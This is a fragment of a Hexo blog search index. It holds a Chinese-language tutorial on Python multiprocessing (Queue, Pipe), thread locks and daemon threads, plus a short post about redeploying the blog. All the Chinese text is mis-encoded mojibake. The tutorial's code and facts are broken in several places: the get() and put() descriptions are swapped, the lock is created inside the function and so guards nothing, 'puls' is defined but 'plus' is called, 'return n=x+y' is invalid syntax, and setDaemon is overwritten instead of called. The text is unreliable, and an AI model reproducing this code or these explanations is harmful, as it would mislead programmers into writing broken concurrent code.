<h2 id="è¿›ç¨‹é—´çš„é€šä¿¡"><a href="#è¿›ç¨‹é—´çš„é€šä¿¡" class="headerlink" title="è¿›ç¨‹é—´çš„é€šä¿¡"></a>è¿›ç¨‹é—´çš„é€šä¿¡</h2><p>æ¯ä¸ªè¿›ç¨‹å„è‡ªæœ‰ä¸åŒçš„ç”¨æˆ·åœ°å€ç©ºé—´,ä»»ä½•ä¸€ä¸ªè¿›ç¨‹çš„å…¨å±€å˜é‡åœ¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸­éƒ½çœ‹ä¸åˆ°ï¼Œæ‰€ä»¥è¿›ç¨‹ä¹‹é—´è¦äº¤æ¢æ•°æ®å¿…é¡»é€šè¿‡å†…æ ¸,åœ¨å†…æ ¸ä¸­å¼€è¾Ÿä¸€å—ç¼“å†²åŒº,è¿›ç¨‹AæŠŠæ•°æ®ä»ç”¨æˆ·ç©ºé—´æ‹·åˆ°å†…æ ¸ç¼“å†²åŒº,è¿›ç¨‹Bå†ä»å†…æ ¸ç¼“å†²åŒºæŠŠæ•°æ®è¯»èµ°,å†…æ ¸æä¾›çš„è¿™ç§æœºåˆ¶ç§°ä¸ºè¿›ç¨‹é—´é€šä¿¡ã€‚å‡å¦‚åˆ›å»ºäº†å¤šä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆè¿›ç¨‹é—´çš„é€šä¿¡æ˜¯å¿…ä¸å¯å°‘çš„ã€‚Python æä¾›äº†å¤šç§è¿›ç¨‹é€šä¿¡çš„æ–¹å¼ï¼Œå…¶ä¸­ä»¥ Queue å’Œ Pipe ç”¨å¾—æœ€å¤šã€‚ä¸‹é¢åˆ†åˆ«ä»‹ç»è¿™ä¸¤ç§æ¨¡å¼ã€‚</p>
<h3 id="å…±äº«å†…å­˜é€šä¿¡"><a href="#å…±äº«å†…å­˜é€šä¿¡" class="headerlink" title="å…±äº«å†…å­˜é€šä¿¡"></a>å…±äº«å†…å­˜é€šä¿¡</h3><p>è®©æ“ä½œç³»ç»Ÿç»´æŒä¸€å—å…±äº«å†…å­˜ï¼Œæ‰€æœ‰è¦äº’ç›¸é€šä¿¡çš„è¿›ç¨‹é€šè¿‡è¿™å—å†…å­˜äº¤æ¢ä¿¡æ¯ã€‚è¿™æ ·åšçš„ç¼ºç‚¹æ˜¯è¦æ ¼å¤–æ³¨æ„æ•°æ®åŒæ­¥é—®é¢˜ã€‚</p>
<p>ä¸‹é¢ä»¥ Python ä¸­ Queue ä¸ºä¾‹å­åšä¸€ä¸ªç¤ºèŒƒã€‚Queue æ˜¯ä¸€ç§å¤šè¿›ç¨‹å®‰å…¨çš„é˜Ÿåˆ—ï¼Œå…¶å®ç°å¤šè¿›ç¨‹é—´çš„é€šä¿¡æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>get() ç”¨äºå‘é˜Ÿåˆ—ä¸­åŠ å…¥æ•°æ®ã€‚æœ‰ä¸¤ä¸ªå±æ€§ï¼šblocked å’Œ timeoutã€‚blocked ä¸º true æ—¶ï¼ˆé»˜è®¤ä¸ºTrueï¼‰ä¸” timeout ä¸ºæ­£å€¼æ—¶ï¼Œå¦‚æœå½“é˜Ÿåˆ—å·²æ»¡ä¼šé˜»å¡ timeout æ—¶é—´ï¼Œåœ¨è¿™ä¸ªæ—¶é—´å†…å¦‚æœé˜Ÿåˆ—æœ‰ç©ºä½ä¼šåŠ å…¥ï¼Œå¦‚æœè¶…è¿‡æ—¶é—´ä»ç„¶æ²¡æœ‰ç©ºä½ä¼šæŠ›å‡º Queue.Full å¼‚å¸¸ã€‚</li>
<li>put() ç”¨äºä»é˜Ÿåˆ—ä¸­è·å–ä¸€ä¸ªæ•°æ®å¹¶å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚æœ‰ä¸¤ä¸ªå±æ€§ï¼šblocked å’Œtimeoutã€‚blocked ä¸º trueï¼ˆé»˜è®¤ä¸ºTrueï¼‰ä¸” timeout ä¸ºæ­£å€¼æ—¶ï¼Œå¦‚æœå½“å‰é˜Ÿåˆ—ä¸ºç©ºä¼šé˜»å¡ timeout æ—¶é—´ï¼Œåœ¨è¿™ä¸ªæ—¶é—´å†…å¦‚æœé˜Ÿåˆ—æœ‰æ–°æ•°æ®ä¼šè·å–ï¼Œå¦‚æœè¶…è¿‡æ—¶é—´ä»ç„¶æ²¡æœ‰æ–°æ•°æ®ä¼šæŠ›å‡º Queue.Empty å¼‚å¸¸ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">q,nums</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š%sï¼Œè¿™æ˜¯ä¸€ä¸ªputè¿›ç¨‹&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        q.put(num)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%då·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼&#x27;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š%sï¼Œè¿™æ˜¯ä¸€ä¸ªgetè¿›ç¨‹&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–%så¹¶ä»ä¸­åˆ é™¤&#x27;</span> % q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=put_data,args=(q,[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>],))</span><br><span class="line">    p2 = Process(target=put_data,args=(q,[<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>],))</span><br><span class="line">    p3 = Process(target=get_data,args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line">    p3.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line">    <span class="comment"># p3æ˜¯ä¸ªæ­»å¾ªç¯ï¼Œéœ€è¦æ‰‹åŠ¨ç»“æŸè¿™ä¸ªè¿›ç¨‹</span></span><br><span class="line">    p3.terminate()</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿è¡Œç»“æœï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š10336ï¼Œè¿™æ˜¯ä¸€ä¸ªputè¿›ç¨‹</span><br><span class="line">1å·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼</span><br><span class="line">2å·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼</span><br><span class="line">3å·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼</span><br><span class="line">ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š9116ï¼Œè¿™æ˜¯ä¸€ä¸ªgetè¿›ç¨‹</span><br><span class="line">å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–1,å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–2å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–3å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š2732ï¼Œè¿™æ˜¯ä¸€ä¸ªputè¿›ç¨‹</span><br><span class="line">4å·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼</span><br><span class="line">5å·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼</span><br><span class="line">å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–4,å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">6å·²ç»æ”¾å…¥é˜Ÿåˆ—ä¸­å•¦ï¼</span><br><span class="line">å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–5å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">å·²ç»ä»é˜Ÿåˆ—ä¸­è·å–6å¹¶ä»ä¸­åˆ é™¤</span><br></pre></td></tr></table></figure>

<h3 id="ç®¡é“é€šä¿¡"><a href="#ç®¡é“é€šä¿¡" class="headerlink" title="ç®¡é“é€šä¿¡"></a>ç®¡é“é€šä¿¡</h3><p>æ“ä½œç³»ç»Ÿåœ¨ä¸¤ä¸ªè¿›ç¨‹é—´ç»´æŒä¸€ä¸ªâ€œç®¡é“â€ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹é€šè¿‡è¿™æ¡ç®¡é“äº¤æ¢å½¼æ­¤çš„ä¿¡æ¯ã€‚è¿™æ ·åšç¼ºç‚¹å¾ˆå¤šï¼Œæ¯”å¦‚åªèƒ½åœ¨ä¸¤ä¸ªè¿›ç¨‹é—´äº¤æ¢æ•°æ®ã€å®¹æ˜“å¼•èµ·é˜»å¡ç­‰ã€‚</p>
<p>ä¸‹é¢ä»¥ Python ä¸­ Pipe ä¸ºä¾‹å­åšä¸€ä¸ªç¤ºèŒƒã€‚Pipe å°±åƒä¸€æ ¹æ°´ç®¡ï¼Œä¸¤è¾¹æ˜¯è¿›ç¨‹ã€‚è®©æˆ‘ä»¬çœ‹çœ‹Pipeå®˜æ–¹æ–‡æ¡£çš„æè¿°ï¼š  </p>
<blockquote>
<p>Returns a pair (conn1, conn2) of Connection objects representing the ends of a pipe.</p>
</blockquote>
<p>Pipe è¿”å› conn1 å’Œ conn2 ä»£è¡¨æ°´ç®¡çš„ä¸¤ç«¯ã€‚Pipe è¿˜æœ‰ä¸€ä¸ªå‚æ•° duplexï¼Œé»˜è®¤ä¸º Trueã€‚å½“ duplex ä¸º True æ—¶ï¼Œå¼€å¯åŒå·¥æ¨¡å¼ï¼Œæ­¤æ—¶æ°´ç®¡çš„ä¸¤è¾¹éƒ½å¯ä»¥è¿›è¡Œæ”¶å‘ã€‚å½“ duplex ä¸º Falseï¼Œé‚£ä¹ˆ <strong>conn1 åªè´Ÿè´£æ¥å—ä¿¡æ¯ï¼Œconn2 åªè´Ÿè´£å‘é€ä¿¡æ¯ã€‚</strong><br>conn é€šè¿‡ send() å’Œ recv() æ¥å‘é€å’Œæ¥å—ä¿¡æ¯ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç®¡é“ä¸­æ²¡æœ‰ä¿¡æ¯å¯æ¥å—ï¼Œrecv() ä¼šä¸€ç›´é˜»å¡ç›´åˆ°ç®¡é“å…³é—­ï¼ˆä»»æ„ä¸€ç«¯è¿›ç¨‹æ¥ç»“æŸåˆ™ç®¡é“å…³é—­ï¼‰ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pipe</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put_data</span>(<span class="params">p,nums</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š%sï¼Œè¿™ä¸ªä¸€ä¸ªsendè¿›ç¨‹&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        p.send(num)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%så·²ç»æ”¾å…¥ç®¡é“ä¸­å•¦ï¼&#x27;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š%sï¼Œè¿™ä¸ªä¸€ä¸ªrecvè¿›ç¨‹&#x27;</span> % os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å·²ç»ä»ç®¡é“ä¸­è·å–%så¹¶ä»ä¸­åˆ é™¤&#x27;</span> % p.recv())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pipe(duplex=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># æ­¤æ—¶Pipe[1]å³æ˜¯Pipeè¿”å›çš„conn2</span></span><br><span class="line">    p1 = Process(target=put_data,args=(p[<span class="number">1</span>],[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>],))</span><br><span class="line">    <span class="comment"># æ­¤æ—¶Pipe[0]å³æ˜¯Pipeè¿”å›çš„conn1</span></span><br><span class="line">    p3 = Process(target=get_data,args=(p[<span class="number">0</span>],))</span><br><span class="line">    p1.start()</span><br><span class="line">    p3.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p3.terminate()</span><br></pre></td></tr></table></figure>

<p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹è¾“å‡ºç»“æœ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š9868ï¼Œè¿™ä¸ªä¸€ä¸ªrecvè¿›ç¨‹</span><br><span class="line">ç°åœ¨çš„è¿›ç¨‹ç¼–å·ä¸ºï¼š9072ï¼Œè¿™ä¸ªä¸€ä¸ªsendè¿›ç¨‹</span><br><span class="line">1å·²ç»æ”¾å…¥ç®¡é“ä¸­å•¦ï¼</span><br><span class="line">å·²ç»ä»ç®¡é“ä¸­è·å–1,å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">2å·²ç»æ”¾å…¥ç®¡é“ä¸­å•¦ï¼</span><br><span class="line">å·²ç»ä»ç®¡é“ä¸­è·å–2å¹¶ä»ä¸­åˆ é™¤</span><br><span class="line">3å·²ç»æ”¾å…¥ç®¡é“ä¸­å•¦ï¼</span><br><span class="line">å·²ç»ä»ç®¡é“ä¸­è·å–3å¹¶ä»ä¸­åˆ é™¤</span><br></pre></td></tr></table></figure>

<h2 id="çº¿ç¨‹é”"><a href="#çº¿ç¨‹é”" class="headerlink" title="çº¿ç¨‹é”"></a>çº¿ç¨‹é”</h2><p>å¤šçº¿ç¨‹ä¸­ä»»åŠ¡ä¸­ï¼Œå¯èƒ½ä¼šå‘ç”Ÿå¤šä¸ªçº¿ç¨‹åŒæ—¶å¯¹ä¸€ä¸ªå…¬å…±èµ„æºï¼ˆå¦‚å…¨å±€å˜é‡ï¼‰è¿›è¡Œæ“ä½œçš„æƒ…å†µï¼Œè¿™æ˜¯å°±ä¼šå‘ç”Ÿæ··ä¹±ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œéœ€è¦å¼•å…¥çº¿ç¨‹é”çš„æ¦‚å¿µã€‚åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¤„äºä¸Šé”çŠ¶æ€ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹ä¸Šé”ä¹‹åï¼Œå¦‚æœæœ‰å¦å¤–ä¸€ä¸ªçº¿ç¨‹è¯•å›¾è·å¾—é”ï¼Œè¯¥çº¿ç¨‹å°±ä¼šæŒ‚èµ·ç›´åˆ°æ‹¥æœ‰é”çš„çº¿ç¨‹å°†é”é‡Šæ”¾ã€‚è¿™æ ·å°±ä¿è¯äº†åŒæ—¶åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯¹å…¬å…±èµ„æºè¿›è¡Œè®¿é—®æˆ–ä¿®æ”¹ã€‚  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puls</span>():</span></span><br><span class="line">    lock = Lock() <span class="comment"># è·å¾—ä¸€ä¸ªé”</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    lock.acquire() <span class="comment"># ä¸Šé”</span></span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    lock.release() <span class="comment"># è§£é”</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t = Thread(target=plus)</span><br><span class="line">        t.start()</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure>

<p>é”çš„å¥½å¤„:</p>
<ol>
<li>ç¡®ä¿æŸæ®µå…³é”®ä»£ç åªèƒ½ç”±ä¸€ä¸ªçº¿ç¨‹ä»å¤´åˆ°å°¾æ‰§è¡Œï¼Œä¿è¯äº†æ•°æ®çš„å”¯ä¸€æ€§ã€‚  </li>
</ol>
<p>é”çš„åå¤„:  </p>
<ol>
<li>é˜»æ­¢äº†å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼Œæ•ˆç‡å¤§å¤§é™ä½ã€‚</li>
<li>ç”±äºå­˜åœ¨å¤šä¸ªé”ï¼Œä¸åŒçš„çº¿ç¨‹æŒæœ‰ä¸åŒçš„é”å¹¶è¯•å›¾è·å–å¯¹æ–¹çš„é”æ—¶ï¼Œå¯èƒ½é€ æˆæ­»é”ã€‚  </li>
</ol>
<h2 id="å®ˆæŠ¤çº¿ç¨‹"><a href="#å®ˆæŠ¤çº¿ç¨‹" class="headerlink" title="å®ˆæŠ¤çº¿ç¨‹"></a>å®ˆæŠ¤çº¿ç¨‹</h2><p>çº¿ç¨‹å…¶å®å¹¶æ²¡æœ‰ä¸»æ¬¡çš„æ¦‚å¿µï¼Œæˆ‘ä»¬ä¸€èˆ¬è¯´çš„â€˜ä¸»çº¿ç¨‹â€™å®é™…ä¸Šæ˜¯ main å‡½æ•°çš„çº¿ç¨‹ï¼Œè€Œæ‰€è°“ä¸»çº¿ç¨‹ç»“æŸå­çº¿ç¨‹ä¹Ÿä¼šç»“æŸæ˜¯å› ä¸ºåœ¨ä¸»çº¿ç¨‹ç»“æŸæ—¶è°ƒç”¨äº†ç³»ç»Ÿçš„é€€å‡ºå‡½æ•°ã€‚è€Œå®ˆæŠ¤çº¿ç¨‹æ˜¯æŒ‡ <code>ä¸é‡è¦çº¿ç¨‹</code>ã€‚ä¸»çº¿ç¨‹åœ¨æ‰€æœ‰ <code>é‡è¦</code> çº¿ç¨‹ç»“æŸåç»“æŸã€‚é€šå¸¸å½“å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨æ—¶ä¼šä¸ºè¿™æ¬¡è®¿é—®å¼€å¯ä¸€ä¸ªå®ˆæŠ¤çº¿ç¨‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">n = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n=x+y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    t = Thread(target=count,args=(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">    t.setDaemon = <span class="literal">True</span> <span class="comment"># è®¾ä¸ºå®ˆæŠ¤è¿›ç¨‹</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.zhihu.com/question/25532384/answer/81152571">è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</a></p>
<p><a href="https://blog.csdn.net/qq_32131499/article/details/94561780">å†™æ—¶å¤åˆ¶</a></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¹¶å‘ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>é‡æ–°å¼€å§‹</title>
    <url>/2017/12/02/%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>å‰é˜µå­æ‰‹è´±åˆ äº†åšå®¢æ–‡ä»¶ï¼Œè¿˜ç³Šé‡Œç³Šæ¶‚åœ°æŠŠcodingé‡Œçš„é¡¹ç›®ä¹Ÿåˆ äº†ã€‚ç„¶åå„ç§èœœæ±é”™è¯¯ï¼Œå„ç§æ— æ³•é‡æ–°éƒ¨ç½²ã€‚æœ€è¿‘å‡ å¤©åˆèœœæ±éƒ¨ç½²æˆåŠŸã€‚å¯ä»¥è¯´ååˆ†éš¾å—äº†ã€‚</p>
<p><img src="%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/%E6%89%B6%E5%A2%99%E5%90%90%E8%A1%80.jpg"></p>
<p>ä¸è¿‡å¡ç¿å¤±é©¬ï¼Œç„‰çŸ¥éç¦ã€‚ç»è¿‡è¿™ä¹ˆä¸€é­æˆ‘å†æ¬¡ç»ƒä¹ äº†ä¸€écoding+hexoä¸‹åšå®¢çš„éƒ¨ç½²ï¼Œä¹Ÿç®—æ˜¯å¥½äº‹ä¸€æ¡©äº†å§ï¼Ÿï¼ˆå¼ºè¡Œè‡ªæˆ‘å®‰æ…°ä¸€æ³¢233ï¼‰<br>ä»¥åæˆ‘ä¸€å®šå¤©å¤©å‘ä¸Šï¼Œé‡æ–°åšäººï¼Œå†ä¸æ‰‹è´±ã€‚</p>
<p><img src="%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/%E8%B7%AA%E5%9C%B0%E5%93%AD.jpg"></p>
<p>å†æ¬¡æ„Ÿè°¢ç‹å“¥çš„æ•™ç¨‹ï¼Œå¾ˆè¯¦ç»†ï¼Œå¸®åŠ©å¾ˆå¤§ï¼Œå¾ˆå¥½ï¼Œå¾ˆæ£’ã€‚æ„Ÿå…´è¶£çš„åŒå¿—å¯ä»¥å»ä»–é‚£é‡Œè½¬è½¬å‘€ï¼ˆæ‰‹åŠ¨æ»‘ç¨½ï¼‰<a href="http://windliang.cc/">windliangçš„åšå®¢</a></p>
<p>æ‰¯åˆ°è¿™é‡Œç®—æ˜¯æš‚æ—¶ç»“æŸï¼Œä»¥åæœ‰æ—¶é—´å†ä¸Šæ¥æ‰¯æ‰¯æ·¡ï¼Œå†™ç‚¹å­¦ä¹ å¿ƒå¾—å•¥çš„å§ã€‚</p>
<p><img src="%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/%E6%BA%9C%E4%BA%86.jpg"></p>
]]></content>
      <categories>
        <category>æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>é—²èŠ</tag>
      </tags>
  </entry>
</search>
